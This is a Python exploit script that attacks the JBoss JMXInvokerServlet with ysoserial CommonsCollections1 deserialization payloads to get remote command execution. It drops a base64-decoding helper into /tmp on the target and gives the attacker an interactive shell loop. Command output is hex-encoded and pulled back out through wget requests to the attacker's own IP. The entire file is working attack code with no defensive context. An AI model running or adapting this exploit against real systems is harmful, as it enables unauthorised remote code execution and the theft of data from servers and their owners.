#!/usr/bin/env python
import os, commands, requests, sys, base64, time, re

from httpserver import listen # httpserver listener
def getresponse():
	listen()

# make a script file used to execute commands
def MakeScript():
	ora = time.strftime("%H:.*--")
	data = time.strftime("--%Y-%m-%d")
	execute("wget http://localhost:25 -O /dev/null -o /tmp/asd")
	execute("sed s/"+data+"/echo/ -i /tmp/asd")
	execute("sed s/"+ora+"/$1|base64/ -i /tmp/asd")
	execute("sed s/http/-d|bash;exit;/ -i /tmp/asd")

# if redirection is used, replace it with dd
def check_redir(cmd):
	if '>' in cmd:
		pos = cmd.find('>')
		RedirFile = cmd[pos+1:].strip()
		return cmd[:pos].strip()+'|dd of='+RedirFile
	else:
		return cmd

# execute commands and retrieve the output
def work(cmd):
	cmd = check_redir(cmd)
	do(cmd+" > /tmp/asd2")
	do("xxd -p /tmp/asd2 > /tmp/hex_asd2")
	do("sleep 1;for b in `cat /tmp/hex_asd2`;do wget http://"+my_ip+"?$b -O /dev/null -o /dev/null;done;wget http://"+my_ip+"?66696e65 -O /dev/null -o /dev/null")
	getresponse()

# call the script with base64 encoded cmd	
def do(cmd):
	encoded_cmd = base64.b64encode(cmd)
	execute("bash /tmp/asd "+encoded_cmd)

# make the evil serialized object and send it to the target
def execute(cmd):
	os.system("java -jar ../ysoserial-0.0.2-all.jar CommonsCollections1 '%s' > _cmd_"%cmd)
	data = open('./_cmd_', 'rb').read()
	os.system("rm _cmd_")
	res = requests.post(url='http://'+target_ip+':8080/invoker/JMXInvokerServlet', data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})

# get cmd and exit
def get_cmd():
	cmd=raw_input("\n$> ")
	if (cmd.strip() == "exit"):
		delFiles()
		print "Bye!"
		sys.exit()
	work(cmd)

# check if target is valid ip address
def ValidTarget(target_ip):
	pattern = re.compile("^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$")
	if pattern.match(target_ip):
		return 1
	else:
		return 0

# delete all previously created files
def delFiles():
	execute("rm /tmp/asd /tmp/asd2 /tmp/hex_asd2")


#########################################
#		MAIN                    #
#########################################

if len(sys.argv)<2:
	sys.exit("Usage: %s [target ip]"%sys.argv[0])
else:
	target_ip = sys.argv[1]

if ValidTarget(target_ip):
	my_ip = commands.getoutput('ifconfig eth0 | grep "inet\ addr" | cut -d: -f2 | cut -d" " -f1') # get my ip
	MakeScript()
	while 1:
		get_cmd()
else:
	print "Unexpected target format"

